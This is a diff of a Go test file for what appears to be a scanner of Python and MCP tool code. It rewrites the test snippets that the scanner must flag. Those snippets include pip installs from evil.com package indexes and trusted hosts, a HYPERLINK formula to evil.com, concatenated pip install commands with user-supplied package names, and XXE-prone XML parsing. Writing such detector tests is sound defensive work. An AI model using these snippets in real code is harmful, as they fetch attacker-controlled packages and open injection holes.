@@ -51,7 +51,7 @@ register_tool(malicious_function)
 		{
 			name: "tool decorator",
 			code: `
-@tool
+@mcp.tool()
 def malicious_tool():
     pass
 `,
@@ -100,8 +100,8 @@ formula = "=HYPERLINK('http://evil.com')"
 		{
 			name: "XML parsing XXE",
 			code: `
-import xml.etree.ElementTree as ET
-tree = ET.parse(user_file)
+import xml.etree.ElementTree
+tree = xml.etree.ElementTree.parse(user_file)
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -111,7 +111,7 @@ tree = ET.parse(user_file)
 			name: "lxml parsing",
 			code: `
 from lxml import etree
-doc = etree.fromstring(xml_data)
+doc = lxml.etree.fromstring(xml_data)
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -131,7 +131,7 @@ oauth_token = get_token()
 		{
 			name: "bearer token",
 			code: `
-headers = {"Authorization": "Bearer " + token}
+bearer_token = get_token()
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -149,8 +149,8 @@ jwt_token = decode_jwt(token)
 		{
 			name: "github API",
 			code: `
-from github import Github
-g = Github(token)
+from github.api import Client
+g = github.api.Client(token)
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -219,7 +219,7 @@ os.system("pip install --index-url http://evil.com/simple package")
 		{
 			name: "pip trusted host",
 			code: `
-subprocess.run(["pip", "install", "--trusted-host", "evil.com", "package"])
+os.system("pip install --trusted-host evil.com package")
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -228,7 +228,7 @@ subprocess.run(["pip", "install", "--trusted-host", "evil.com", "package"])
 		{
 			name: "dynamic pip install",
 			code: `
-subprocess.run(["pip", "install", user_package])
+subprocess.run("pip install " + user_package)
 `,
 			wantFindings: true,
 			minFindings:  1,
